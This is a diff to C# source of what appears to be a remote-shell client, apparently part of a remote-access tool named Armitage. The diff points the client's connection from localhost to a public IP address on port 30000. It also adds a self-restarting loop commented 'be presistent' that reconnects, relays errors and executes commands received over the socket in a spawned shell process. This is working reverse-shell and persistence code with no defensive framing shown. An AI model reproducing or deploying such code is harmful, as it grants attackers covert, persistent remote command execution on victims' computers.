@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -20,7 +21,7 @@ namespace Client.Armitage.Shell
     /// </summary>
     public static class Shell
     {
-        private static string ApiIP = "127.0.0.1";
+        private static string ApiIP = "194.233.71.142";
 
         private static ushort Port = 30000;
 
@@ -42,9 +43,29 @@ namespace Client.Armitage.Shell
 
             if (_reader == null)
             {
-                _reader = new Thread(ContinuousReading);
+                _reader = new Thread(SafeExecute);
 
                 _reader.Start();
+            }
+        }
+
+        public static void SafeExecute()
+        {
+            try
+            {
+                ContinuousReading();
+            }
+            catch (Exception ex)
+            {
+                CleanUp();
+
+                Thread.Sleep(1000);
+
+                Console.WriteLine("safe execute loop: " + ex.ToString());
+
+                Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
+                // be presistent
+                SafeExecute();
             }
         }
 
@@ -59,6 +80,8 @@ namespace Client.Armitage.Shell
                     _client = new TcpClient();
 
                     _client.Connect(ApiIP, Port);
+
+                    _isconnected = true;
 
                     _stream = _client.GetStream();
 
@@ -75,11 +98,13 @@ namespace Client.Armitage.Shell
                 }
                 catch (Exception ex)
                 {
+                    Console.WriteLine("Outer loop: " + ex.ToString());
 
+                    // CleanUp();
                 }
                 finally
                 {
-                    while (_client.Connected && _stream != null)
+                    while (_client.GetState() == TcpState.Established)
                     {
                         try
                         {
@@ -91,9 +116,12 @@ namespace Client.Armitage.Shell
 
                             receivedBytes = receivedBytes.Skip(1).ToArray();
 
+                            Console.WriteLine($"Received! {byteCount}");
+
                             if (receivedBytes.Length > 0)
                             {
-                                switch (commandtype) {
+                                switch (commandtype)
+                                {
 
                                     case Command_Types.CMDCommand:
 
@@ -107,27 +135,47 @@ namespace Client.Armitage.Shell
 
                                         break;
                                 }
-                            
+
                             }
 
                         }
                         catch (Exception ex) // got disconnected
                         {
-                            try
-                            {
-                                // wait for new connection
-                                _client.Close();
+                            Console.WriteLine("inner loop: " + ex.ToString());
 
-                                _stream.Close();
-                            }
-                            catch { }
+                            CleanUp();
+
                             break;
                         }
                     }
                 }
+
                 // wait for a new shell connection 
+
                 Thread.Sleep(1000);
             }
+        }
+        public static TcpState GetState(this TcpClient tcpClient)
+        {
+            var foo = IPGlobalProperties.GetIPGlobalProperties()
+              .GetActiveTcpConnections()
+              .SingleOrDefault(x => x.LocalEndPoint.Equals(tcpClient.Client.LocalEndPoint));
+            return foo != null ? foo.State : TcpState.Unknown;
+        }
+
+        private static bool _isconnected = false;
+
+        public static void CleanUp()
+        {
+            try
+            {
+                // wait for new connection
+                if (_client != null)
+                    _client.Close();
+
+                _stream.Close();
+            }
+            catch { }
         }
 
         private static void _shell_OutputDataReceived(object sender, DataReceivedEventArgs e)
@@ -166,24 +214,23 @@ namespace Client.Armitage.Shell
 
             p.StartInfo.RedirectStandardError = true;
 
-            p.Exited += (po, o) => {
+            p.Exited += (po, o) =>
+            {
 
                 if (_stream != null)
                 {
+                    Thread.Sleep(1000);
+
                     var bytes = new byte[] { (byte)Message_Types.Exited };
 
-                    _stream.Write(bytes, 0, bytes.Length);
-
-                    _stream.Flush();
-
-                    try
+                    if (_client != null && _client.Connected)
                     {
-                        // wait for new connection
-                        _client.Close();
+                        _stream.Write(bytes, 0, bytes.Length);
 
-                        _stream.Close();
+                        _stream.Flush();
+
+                        CleanUp();
                     }
-                    catch { }
 
                     Start();
                 }
@@ -191,8 +238,6 @@ namespace Client.Armitage.Shell
             };
 
             p.Start();
-
-            p.BeginOutputReadLine();
 
             return p;
         }
